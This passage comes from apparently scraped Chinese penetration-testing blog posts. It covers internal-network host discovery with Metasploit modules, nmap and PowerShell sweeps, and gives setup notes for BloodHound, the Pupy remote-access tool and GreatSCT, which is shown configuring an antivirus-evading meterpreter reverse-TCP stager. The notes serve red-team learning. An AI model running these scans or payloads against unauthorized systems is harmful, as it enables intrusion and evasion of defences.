‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐BATCHSIZE 256 yes The number of hosts to scan per setDELAY 0 yes The delay between connections, per thread, in millisecond sINTERFACE no The name of the interfaceJITTER 0 yes The delay jitter factor (maximum value by which to +/‐ DELAY) in milliseconds.PORTS 80 yes Ports to scan (e.g. 22‐25,80,110‐900)RHOSTS 192.168.1.119 yes The target address range or CIDR identifierSNAPLEN 65535 yes The number of bytes to captureTHREADS 50 yes The number of concurrent threadsTIMEOUT 500 yes The reply read timeout in milliseconds msf auxiliary(scanner/portscan/xmas) &gt; exploit 0x14 auxiliary/scanner/rdp/rdp_scanner该模块是基于RDP服务扫描来发现内网存活主机。 123456789101112131415161718192021msf auxiliary(scanner/rdp/rdp_scanner) &gt; show options Module options (auxiliary/scanner/rdp/rdp_scanner): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐CredSSP true yes Whether or not to request CredSSPEarlyUser false yes Whether to support Earlier User Authorization Result PDURHOSTS 192.168.1.2,115,119 yes The target address range or CIDR identifierRPORT 3389 yes The target port (TCP)THREADS 50 yes The number of concurrent threadsTLS true yes Wheter or not request TLS security msf auxiliary(scanner/rdp/rdp_scanner) &gt; exploit [*] Scanned 1 of 3 hosts (33% complete)[+] 192.168.1.115:3389 ‐ Identified RDP[*] Scanned 2 of 3 hosts (66% complete)[+] 192.168.1.119:3389 ‐ Identified RDP[*] Scanned 3 of 3 hosts (100% complete)[*] Auxiliary module execution completed 0x15 auxiliary/scanner/smtp/smtp_version该模块用于探测内网的SMTP服务。 1234567891011msf auxiliary(scanner/smtp/smtp_version) &gt; show options Module options (auxiliary/scanner/smtp/smtp_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.5 yes The target address range or CIDR identifierRPORT 25 yes The target port (TCP)THREADS 50 yes The number of concurrent threadsmsf auxiliary(scanner/smtp/smtp_version) &gt; exploit 0x16 auxiliary/scanner/pop3/pop3_version该模块用于探测内网的POP3服务。 123456789101112131415msf auxiliary(scanner/pop3/pop3_version) &gt; show options Module options (auxiliary/scanner/pop3/pop3_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.110‐120 yes The target address range or CIDR identifierRPORT 110 yes The target port (TCP)THREADS 50 yes The number of concurrent threads msf auxiliary(scanner/pop3/pop3_version) &gt; exploit [*] Scanned 5 of 11 hosts (45% complete)[*] Scanned 11 of 11 hosts (100% complete)[*] Auxiliary module execution completed 0x17 auxiliary/scanner/postgres/postgres_version该模块用于探测内网的PostgreSQL服务。 1234567891011121314151617181920msf auxiliary(scanner/postgres/postgres_version) &gt; show options Module options (auxiliary/scanner/postgres/postgres_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐DATABASE template1 yes The database to authenticate againstPASSWORD msf no The password for the specified username. Leave blank for a random password.RHOSTS 127.0.0.1 yes The target address range or CIDR identifierRPORT 5432 yes The target portTHREADS 50 yes The number of concurrent threadsUSERNAME msf yes The username to authenticate asVERBOSE false no Enable verbose output msf auxiliary(scanner/postgres/postgres_version) &gt; exploit [*] 127.0.0.1:5432 Postgres ‐ Version PostgreSQL 9.6.6 on x86_64‐pc‐linux‐gnu, compiled by gcc (Debian 4.9.2‐10) 4.9.2, 64‐bit (Post‐Auth)[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 0x18 auxiliary/scanner/ftp/anonymous该模块是基于FTP匿名访问来发现内网存活主机。 123456789101112131415161718192021msf auxiliary(scanner/ftp/anonymous) &gt; show options Module options (auxiliary/scanner/ftp/anonymous): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐FTPPASS mozilla@example.com no The password for the specified usernameFTPUSER anonymous no The username to authenticate asRHOSTS 192.168.1.100‐120 yes The target address range or CIDR identifierRPORT 21 yes The target port (TCP)THREADS 50 yes The number of concurrent threads msf auxiliary(scanner/ftp/anonymous) &gt; exploit [+] 192.168.1.115:21 ‐ 192.168.1.115:21 ‐ Anonymous READ (220 Slyar Ftpserver)[+] 192.168.1.119:21 ‐ 192.168.1.119:21 ‐ Anonymous READ (220 FTPserver)[*] Scanned 3 of 21 hosts (14% complete)[*] Scanned 6 of 21 hosts (28% complete)[*] Scanned 17 of 21 hosts (80% complete)[*] Scanned 21 of 21 hosts (100% complete)[*] Auxiliary module execution completed 0x19 db_nmap和hosts内置命令MSF内置强大的端口扫描工具Nmap，为了更好的区别，内置命令为：db_nmap，并且会自动存储nmap扫描结果到数据库中，方便快速查询已知存活主机，以及更快捷的进行团队协同作战，使用方法与nmap一致。也是在实战中最常用到的发现内网存活主机方式之一。 1234567891011121314msf exploit(multi/handler) &gt; db_nmap ‐p 445 ‐T4 ‐sT 192.168.1.115‐120‐‐open[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2019‐02‐17 15:17 EST[*] Nmap: Nmap scan report for 192.168.1.115[*] Nmap: Host is up (0.0025s latency).[*] Nmap: PORT STATE SERVICE[*] Nmap: 445/tcp open microsoft‐ds[*] Nmap: MAC Address: 00:0C:29:AF:CE:CC (VMware)[*] Nmap: Nmap scan report for 192.168.1.119[*] Nmap: Host is up (0.0026s latency).[*] Nmap: PORT STATE SERVICE[*] Nmap: 445/tcp open microsoft‐ds[*] Nmap: MAC Address: 00:0C:29:85:D6:7D (VMware)[*] Nmap: Nmap done: 6 IP addresses (2 hosts up) scanned in 13.35 seconds 运行db_nmap命令如果出现Database not connected错误，退出msfconsole并执行以下命令： 12345678root@kali:/home/kali# msfdb init[+] Starting database[+] Creating database user 'msf'[+] Creating databases 'msf'[+] Creating databases 'msf_test'[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'[+] Creating initial database schema/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil hosts命令可以查看数据库中已发现的内网存活主机： 1234567891011121314151617181920212223242526272829303132msf exploit(multi/handler) &gt; hosts Hosts===== address mac name os_name os_flavor os_sp purpose info comments‐‐‐‐‐‐‐ ‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐1.34.37.188 firewall10.0.0.2 00:24:1d:dc:3b:1610.0.0.3 00:e0:81:bf:b9:7b10.0.0.4 00:30:6e:ca:10:b810.0.0.5 9c:8e:99:c4:63:74 2013XXXXX Windows 2008 SP1 client...10.0.0.242 00:13:57:01:d4:7110.0.0.243 00:13:57:01:d4:73....10.162.110.30 firewall59.125.110.178 firewall127.0.0.1 Unknown device172.16.204.8 WIN‐6FEAACQJ691 Windows 2012 server172.16.204.9 WIN‐6FEAACQJ691 Windows 2012 server172.16.204.21 IDS Windows 2003 SP2 server192.168.1.5 JOHN‐PC Windows 7 SP1 client192.168.1.101 JOHN‐PC Windows 7 Ultimate SP1 client192.168.1.103 LAPTOP‐9994K8RP Windows 10 client192.168.1.115 00:0c:29:af:ce:cc VM_2003X86 Windows 2003 SP2 server192.168.1.116 WIN‐S4H51RDJQ3M Windows 2012 server192.168.1.119 00:0c:29:85:d6:7d WIN03X64 Windows 2003 SP2 server192.168.1.254 Unknown device192.168.50.30 WINDOWS‐G4MMTV8 Windows 7 SP1 client192.168.100.2 Unknown device192.168.100.10 同样hosts命令也支持数据库中查询与搜索，方便快速对应目标存活主机： 123456789101112131415161718192021222324252627282930313233343536msf exploit(multi/handler) &gt; hosts ‐hUsage: hosts [ options ] [addr1 addr2 ...] OPTIONS:‐a,‐‐add Add the hosts instead of searching‐d,‐‐delete Delete the hosts instead of searching‐c &lt;col1,col2&gt; Only show the given columns (see list below)‐C &lt;col1,col2&gt; Only show the given columns until the next restart (see list below)‐h,‐‐help Show this help information‐u,‐‐up Only show hosts which are up‐o &lt;file&gt; Send output to a file in csv format‐O &lt;column&gt; Order rows by specified column number‐R,‐‐rhosts Set RHOSTS from the results of the search‐S,‐‐search Search string to filter by‐i,‐‐info Change the info of a host‐n,‐‐name Change the name of a host‐m,‐‐comment Change the comment of a host‐t,‐‐tag Add or specify a tag to a range of hostsmsf exploit(multi/handler) &gt; hosts ‐S 192 Hosts===== address mac name os_name os_flavor os_sp purpose info comments‐‐‐‐‐‐‐ ‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐192.168.1.5 JOHN‐PC Windows 7 SP1 client192.168.1.101 JOHN‐PC Windows 7 Ultimate SP1 client192.168.1.103 LAPTOP‐9994K8RP Windows 10 client192.168.1.115 00:0c:29:af:ce:cc VM_2003X86 Windows 2003 SP2 server192.168.1.116 WIN‐S4H51RDJQ3M Windows 2012 server192.168.1.119 00:0c:29:85:d6:7d WIN03X64 Windows 2003 SP2 server192.168.1.254 Unknown device192.168.50.30 WINDOWS‐G4MMTV8 Windows 7 SP1 client192.168.100.2 Unknown device192.168.100.10 0x1A post/windows/gather/arp_scanner在实战中，许多特殊环境下scanner模块、db_nmap内置命令等均不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而post下的模块弥补了该诉求，以便快速了解域中存活主机。 该后渗透模块用于探测域内存活主机： 123456meterpreter &gt; run windows/gather/arp_scanner RHOSTS=192.168.1.110‐120 THREADS=20[*] Running module against VM_2003X86[*] ARP Scanning 192.168.1.110‐120[+] IP: 192.168.1.115 MAC 00:0c:29:af:ce:cc (VMware, Inc.)[+] IP: 192.168.1.119 MAC 00:0c:29:85:d6:7d (VMware, Inc.) 0x1B post/windows/gather/enum_ad_computers该后渗透模块用于探测域内存活主机： 1meterpreter &gt; run windows/gather/enum_ad_computers 0x1C post/windows/gather/enum_computers该后渗透模块用于探测域内存活主机： 1234meterpreter &gt; run windows/gather/enum_computers [*] Running module against VM_2003X86[‐] This host is not part of a domain. 0x1D post/windows/gather/enum_domain该后渗透模块用于探测域内存活主机： 1meterpreter &gt; run windows/gather/enum_domain 0x1E post/windows/gather/enum_domains该后渗透模块用于探测域内存活主机： 1234meterpreter &gt; run windows/gather/enum_domains [*] Enumerating DCs for WORKGROUP[‐] No Domain Controllers found... 0x1F post/windows/gather/enum_ad_user_comments该后渗透模块用于探测域内存活主机： 1meterpreter &gt; run windows/gather/enum_ad_user_comments 0x20 其他post下的模块列举如下： linux/gather/enum_network linux/busybox/enum_hosts windows/gather/enum_ad_users windows/gather/enum_domain_tokens windows/gather/enum_snmp","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"BloodHound、Pupy和GreatSCT工具笔记","date":"2021-02-24T13:25:09.000Z","path":"2021/02/24/BloodHound、Pupy和GreatSCT工具笔记/","text":"0x00 前言参考Micro8系列第十六课：https://micro8.gitbook.io/micro8/contents-1/11-20/16-hong-lan-dui-kang-shen-tou-ce-shi-1 参考Micro8系列第十七课：https://micro8.gitbook.io/micro8/contents-1/11-20/17-hong-lan-dui-kang-shen-tou-ce-shi-2 参考Micro8系列第十八课：https://micro8.gitbook.io/micro8/contents-1/11-20/18-hong-lan-dui-kang-shen-tou-ce-shi-3 0x01 BloodHoundBloodHound是一款免费的域分析工具，其使用可视化图来显示Active Directory环境中隐藏的和相关联的主机内容。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用BloodHound来识别和防御那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active Directory环境中的权限关系。 工具地址：https://github.com/BloodHoundAD/BloodHound 在内网渗透的域分析工具BloodHound小节中有具体说明。 0x02 PupyPupy是一个开源、跨平台（Windows、Linux、OSX、Android）、多功能RAT（远程管理工具）和主要用Python编写的后期开发工具。它具有全内存读取操作、进程注入等功能。Pupy可以使用各种传输进行通信，迁移到进程（注入），从内存加载远程Python代码。 项目地址：https://github.com/n1nj4sec/pupy 安装： 1234567891011git clone https://github.com/n1nj4sec/pupy.gitcd pupy/pupypip install rpycgit submodule updatecd ..pip install -r pupy/requirements.txtwget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txztar xvf payload_templates.txz &amp;&amp; mv payload_templates/* pupy/payload_templates/ &amp;&amp; rm payload_templates.txz &amp;&amp; rm -r payload_templatescd pupyapt-get install python-xlib./pupysh.py 如果出现如下报错： 12345678910111213Collecting pyautoguiUsing cached PyAutoGUI-0.9.36.tar.gzComplete output from command python setup.py egg_info: Traceback (most recent call last): File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt; File &quot;/tmp/pip-build-a90ODY/pyautogui/setup.py&quot;, line 6, in &lt;module&gt; version=__import__(&apos;pyautogui&apos;).__version__, File &quot;pyautogui/__init__.py&quot;, line 115, in &lt;module&gt; from . import \\_pyautogui_x11 as platformModule File &quot;pyautogui/_pyautogui_x11.py&quot;, line 160, in &lt;module&gt; _display = Display(os.environ[&apos;DISPLAY&apos;]) File &quot;/usr/lib/python2.7/UserDict.py&quot;, line 40, in __getitem__ raise KeyError(key) KeyError: &apos;DISPLAY&apos; must install on local server with GUI 0x03 GreatSCTGreatSCT是一款生成可绕过常见反病毒检测机制和应用白名单机制的Metasploit payload的工具。 项目地址：https://github.com/GreatSCT/GreatSCT 安装： 12345apt-get -y install gitgit clone https://github.com/GreatSCT/GreatSCT.gitcd GreatSCT/cd setupsudo ./setup.sh -c 运行后： 1234567891011121314151617181920212223242526272829303132333435363738394041===========================================================================Great Scott!======================================================================================================================================================Payload information: Name: Pure MSBuild C# Reverse TCP StagerLanguage: msbuildRating: ExcellentDescription: pure windows/meterpreter/reverse_tcp stager, noshellcode Payload: msbuild/meterpreter/rev_tcp selected Required Options: Name Value Description‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐DOMAIN X Optional: Required internal domainEXPIRE_PAYLOAD X Optional: Payloads expire after &quot;Y&quot; daysHOSTNAME X Optional: Required system hostnameINJECT_METHOD Virtual Virtual or HeapLHOST IP of the Metasploit handlerLPORT 4444 Port of the Metasploit handlerPROCESSORS X Optional: Minimum number of processorsSLEEP X Optional: Sleep &quot;Y&quot; seconds, check if acceleratedTIMEZONE X Optional: Check to validate not in UTCUSERNAME X Optional: The required user accountAvailable Commands: back Go backexit Completely exit GreatSCTgenerate Generate the payloadoptions Show the shellcode&apos;s optionsset Set shellcode option [msbuild/meterpreter/rev_tcp&gt;&gt;] set LHOST 192.168.1.4 41[msbuild/meterpreter/rev_tcp&gt;&gt;] set LPORT 53","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"工具","slug":"工具","permalink":"https://www.mi1k7ea.com/tags/工具/"}]},{"title":"探测内网存活主机","date":"2021-02-24T13:06:21.000Z","path":"2021/02/24/探测内网存活主机/","text":"0x00 前言本部分和内网渗透的探测域内存活主机相似，某些工具命令的具体使用可查询该篇文章。 参考Micro8系列第十二课：https://micro8.gitbook.io/micro8/contents-1/11-20/12-ji-yu-udp-fa-xian-nei-wang-cun-huo-zhu-ji 参考Micro8系列第十三课：https://micro8.gitbook.io/micro8/contents-1/11-20/13-ji-yu-arp-fa-xian-nei-wang-cun-huo-zhu-ji 参考Micro8系列第十九课：https://micro8.gitbook.io/micro8/contents-1/11-20/19-ji-yu-netbios-fa-xian-nei-wang-cun-huo-zhu-ji 参考Micro8系列第二十课：https://micro8.gitbook.io/micro8/contents-1/11-20/20-ji-yu-snmp-fa-xian-nei-wang-cun-huo-zhu-ji 参考Micro8系列第二十一课：https://micro8.gitbook.io/micro8/contents-1/21-30/21-ji-yu-icmp-fa-xian-nei-wang-cun-huo-zhu-ji 参考Micro8系列第二十二课：https://micro8.gitbook.io/micro8/contents-1/21-30/22-ji-yu-smb-fa-xian-nei-wang-cun-huo-zhu-ji 0x01 基于UDP的探测UDP简介UDP（User Datagram Protocol）用户数据包协议，是OSI参考模型中一种无连接的传输层协议，提供面向事务的简单不可靠信息传送服务。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是无法得知其是否安全完整到达的。 UDP具有以下特点： 无连接：UDP客户端和服务端之间不必存在长期的关系。大多数的UDP实现中都选择忽略源站抑制差错，在网络拥塞时，目的端无法接收到大量的UDP数据报； 缺乏可靠性：UDP本身不提供确认，超时重传等机制。UDP数据报可能在网络中被复制，被重新排序，也不保证每个数据报只到达一次； UDP数据报是有长度的：每个UDP数据报都有长度，如果一个数据报正确地到达目的地，那么该数据报的长度将随数据一起传递给接收方。而TCP是一个字节流协议，没有任何（协议上的）记录边界； 支持多播和广播； Nmap扫描1nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500 比较慢。 MSF模块扫描模块1： 1msf &gt; use auxiliary/scanner/discovery/udp_probe 模块2： 1msf &gt; use auxiliary/scanner/discovery/udp_sweep unicornscan扫描Linux下推荐使用： 1unicornscan -mU 192.168.1.100 ScanLine扫描ScanLine是一个同时支持TCP和UDP端口扫描的体积小的端口扫描工具，可以在所有版本的Windows上使用： 1sl -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\\windows\\temp\\sl_res.txt -p 192.168.1.1-254 /b 在线基于Nmap的UDP扫描https://pentest-tools.com/network-vulnerability-scanning/udp-port-scanner-online-nmap 0x02 基于ARP的探测ARP简介ARP（Address Resolution Protocol）地址解析协议，是根据IP地址获取物理地址的一个TCP/IP协议。 主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。 地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个ARP欺骗。 ARP命令可用于查询本机ARP缓存中IP地址和MAC地址的对应关系、添加或删除静态对应关系等。 Nmap扫描1nmap -sn -PR 192.168.1.1/24 MSF模块扫描1234567891011121314151617msf &gt; use auxiliary/scanner/discovery/arp_sweepmsf auxiliary(arp_sweep) &gt; show optionsModule options (auxiliary/scanner/discovery/arp_sweep):Name Current Setting Required Description---- --------------- -------- -----------INTERFACE no The name of the interfaceRHOSTS yes The target address range or CIDR identifierSHOST no Source IP AddressSMAC no Source MAC AddressTHREADS 1 yes The number of concurrent threadsTIMEOUT 5 yes The number of seconds to wait for new datamsf auxiliary(arp_sweep) &gt; set RHOSTS 192.168.1.0/24RHOSTS =&gt; 192.168.1.0/24msf auxiliary(arp_sweep) &gt; set THREADS 10 netdiscover扫描1netdiscover -r 192.168.1.0/24 -i wlan0 arp-scan扫描Linux推荐： https://linux.die.net/man/1/arp-scan 在Kali中有自带的。 Windows推荐（非官方）：https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan 1arp-scan.exe -t 192.168.1.1/24 PowerShell脚本扫描1powershell.exe -exec bypass -Command \"Import-Module .\\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24\" 可用Nishang中的Invoke-ARPScan.ps1脚本。 arp scannet扫描项目地址： https://sourceforge.net/projects/arpscannet/files/arpscannet/arpscannet 0.4/ arp-ping.exe扫描1arp-ping.exe 192.168.1.100 0x03 基于NetBIOS的探测NetBIOS简介NetBIOS，为网上基本输入输出系统（Network Basic Input/Output System）的缩写，它提供了OSI模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。严格来说，NetBIOS不是一种网上协议，而是应用程序接口（API）。较古老的操作系统，使用IEEE 802.2与IPX/SPX协议，可以使用NetBIOS Frames协议或NetBIOS over IPX/SPX协议来运作。现代操作系统，多数都使用TCP/IP协议，则可透过NetBIOS over TCP/IP协议来相互通信。 几乎所有的局域网都是基于NetBIOS基础上进行工作的，NetBIOS的工作流程就是正常的机器名解析查询应答过程，因此在内网探测域内存活主机时优先使用NetBIOS进行探测。 IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。 系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享。 Nmap扫描1nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4 MSF模块扫描1msf &gt; use auxiliary/scanner/netbios/nbname nbtscan扫描nbtscan是一个命令行工具，用于扫描本地或远程TCP/IP网络上的开放NetBIOS名称服务器。其有Windows版本和Linux版本，体积很小，且不需要特殊的库或DLL，使用简单，无参输入nbtscan.exe即可查看帮助文档。 Windows版： http://www.unixwiz.net/tools/nbtscan.html 1nbtscan.exe 192.168.1.0/24 它是基于标准的Windows工具nbtstat来实现的，推荐命令： 1nbtstat -n Linux版：https://github.com/scallywag/nbtscan 其中Kali中是自带的。 NetBScanner扫描项目地址： https://www.nirsoft.net/utils/netbios_scanner.html 0x04 基于SNMP的探测SNMP简介 SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。 Nmap扫描1nmap -sU --script snmp-brute 192.168.1.0/24 -T4 MSF模块扫描1msf &gt; use auxiliary/scanner/snmp/snmp_enum 其他SNMP相关模块： 1234567891011use auxiliary/scanner/snmp/aix_version use auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/arris_dg950use auxiliary/scanner/snmp/snmp_enum_hp_laserjetuse auxiliary/scanner/snmp/brocade_enumhash use auxiliary/scanner/snmp/snmp_enumshares use auxiliary/scanner/snmp/cambium_snmp_loot use auxiliary/scanner/snmp/snmp_enumusersuse auxiliary/scanner/snmp/cisco_config_tftp use auxiliary/scanner/snmp/snmp_loginuse auxiliary/scanner/snmp/cisco_upload_file use auxiliary/scanner/snmp/snmp_setuse auxiliary/scanner/snmp/netopia_enumuse auxiliary/scanner/snmp/ubee_ddw3611 use auxiliary/scanner/snmp/sbg6580_enumuse auxiliary/scanner/snmp/xerox_workcentre_enumusers NetCrunch扫描项目地址： https://www.adremsoft.com/demo/ NetCrunch是一款内网安全审计工具，包含了DNS审计、ping扫描、端口、网络服务等。 SNMP Perl脚本扫描项目地址： https://github.com/dheiland-r7/snmp 如果出现这个问题：Can’t locate NetAddr/IP 123456wget http://www.cpan.org/modules/by-module/NetAddr/NetAddr-IP-4.078.tar.gztar xvzf ./NetAddr-IP-4.078.tar.gzcd NetAddr-IP-4.078/perl Makefile.PLmakemake install SNMP Scanner扫描项目地址：https://www.solarwinds.com/topics/snmp-scanner NetScanTools Pro SNMP扫描项目地址：https://www.netscantools.com/nstpro_snmp.html 0x05 基于ICMP的探测ICMP简介ICMP（Internet Control Message Protocol）Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。这些控制消息虽然并不传输用户数据，但是对于用户数据的传递起着重要的作用。 Nmap扫描12nmap ‐sP ‐PI 192.168.1.0/24 ‐T4nmap ‐sn ‐PE ‐T4 192.168.1.0/24 CMD下扫描1for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr \"TTL =\" PowerShell脚本扫描123powershell.exe ‐exec bypass ‐Command \"Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135\" 脚本地址：https://github.com/sirrushoo/Powershell-Tools/blob/master/Invoke-TSPingSweep.ps1 tcping.exe扫描1tcping.exe ‐n 1 192.168.1.0 80 0x06 基于SMB探测SMB简介SMB（全称是Server Message Block）是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。SMB最初是IBM的贝瑞·费根鲍姆（Barry Feigenbaum）研制的，其目的是将DOS操作系统中的本地文件接口“中断13”改造为网络文件系统。 Nmap script扫描12345678910111213141516171819202122232425262728293031323334353637383940root@John:~# nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.1.119Starting Nmap 7.70 ( https://nmap.org ) at 2019‐01‐29 08:45 ESTNmap scan report for 192.168.1.119Host is up (0.0029s latency). PORT STATE SERVICE445/tcp open microsoft‐ds445/udp open|filtered microsoft‐dsMAC Address: 00:0C:29:85:D6:7D (VMware) Host script results:| smb‐enum‐shares:| account_used: guest| \\\\192.168.1.119\\ADMIN$:| Type: STYPE_DISKTREE_HIDDEN| Comment: \\xE8\\xBF\\x9C\\xE7\\xA8\\x8B\\xE7\\xAE\\xA1\\xE7\\x90\\x86| Anonymous access: &lt;none&gt;| Current user access: &lt;none&gt;| \\\\192.168.1.119\\C$:| Type: STYPE_DISKTREE_HIDDEN| Comment: \\xE9\\xBB\\x98\\xE8\\xAE\\xA4\\xE5\\x85\\xB1\\xE4\\xBA\\xAB| Anonymous access: &lt;none&gt;| Current user access: &lt;none&gt;| \\\\192.168.1.119\\E$:| Type: STYPE_DISKTREE_HIDDEN| Comment: \\xE9\\xBB\\x98\\xE8\\xAE\\xA4\\xE5\\x85\\xB1\\xE4\\xBA\\xAB| Anonymous access: &lt;none&gt;| Current user access: &lt;none&gt;| \\\\192.168.1.119\\IPC$:| Type: STYPE_IPC_HIDDEN| Comment: \\xE8\\xBF\\x9C\\xE7\\xA8\\x8B IPC| Anonymous access: READ| Current user access: READ/WRITE| \\\\192.168.1.119\\share:| Type: STYPE_DISKTREE| Comment:| Anonymous access: &lt;none&gt;|_ Current user access: READ/WRITE Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds MSF模块扫描123456789101112131415161718192021222324252627282930msf auxiliary(scanner/smb/smb_version) &gt; show optionsModule options (auxiliary/scanner/smb/smb_version): Name Current Setting Required Description‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐RHOSTS 192.168.1.0/24 yes The target address range or CIDR identifierSMBDomain . no The Windows domain to use for authenticationSMBPass no The password for the specified usernameSMBUser no The username to authenticate asTHREADS 1 yes The number of concurrent threads msf auxiliary(scanner/smb/smb_version) &gt; set threads 20threads =&gt; 20msf auxiliary(scanner/smb/smb_version) &gt; exploit [+] 192.168.1.4:445 ‐ Host is running Windows 7 Ultimate SP1 (build:7601) (name:XXXXXX) (workgroup:WORKGROUP )[*] Scanned 39 of 256 hosts (15% complete)[*] Scanned 61 of 256 hosts (23% complete)[*] Scanned 81 of 256 hosts (31% complete)[+] 192.168.1.99:445 ‐ Host is running Windows 7 Ultimate SP1 (build:7601) (name:XXXXXX) (workgroup:WORKGROUP )[+] 192.168.1.119:445 ‐ Host is running Windows 2003 R2 SP2 (build:3790) (name:XXXXXX)[*] Scanned 103 of 256 hosts (40% complete)[*] Scanned 130 of 256 hosts (50% complete)[*] Scanned 154 of 256 hosts (60% complete)[*] Scanned 181 of 256 hosts (70% complete)[*] Scanned 205 of 256 hosts (80% complete)[*] Scanned 232 of 256 hosts (90% complete)[*] Scanned 256 of 256 hosts (100% complete)[*] Auxiliary module execution completed CMD下扫描1for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445 PowerShell脚本扫描一句话扫描，单个IP： 1445 | %&#123; echo ((new‐object Net.Sockets.TcpClient).Connect(\"192.168.1.119\",$_)) \"$_ is open\"&#125; 2&gt;$null 多个IP： 11..5 | % &#123; $a = $_; 445 | % &#123;echo ((new‐object Net.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; 多个端口和IP： 1118..119 | % &#123; $a = $_; write‐host \"‐‐‐‐‐‐\"; write‐host \"192.168.1.$a\"; 80,445 | % &#123;echo ((new‐object Net.Sockets.TcpClient).Connect(\"192.168.1.$a\",$_)) \"Port $_ is open\"&#125; 2&gt;$null&#125; CME扫描 CrackMapExec（CME）是一款后渗透利用工具，可帮助自动化大型活动目录(AD)网络安全评估任务。其缔造者@byt3bl33d3r称，该工具的生存概念是，“利用AD内置功能/协议达成其功能，并规避大多数终端防护/IDS/IPS解决方案。” 1234567root@John:~# cme 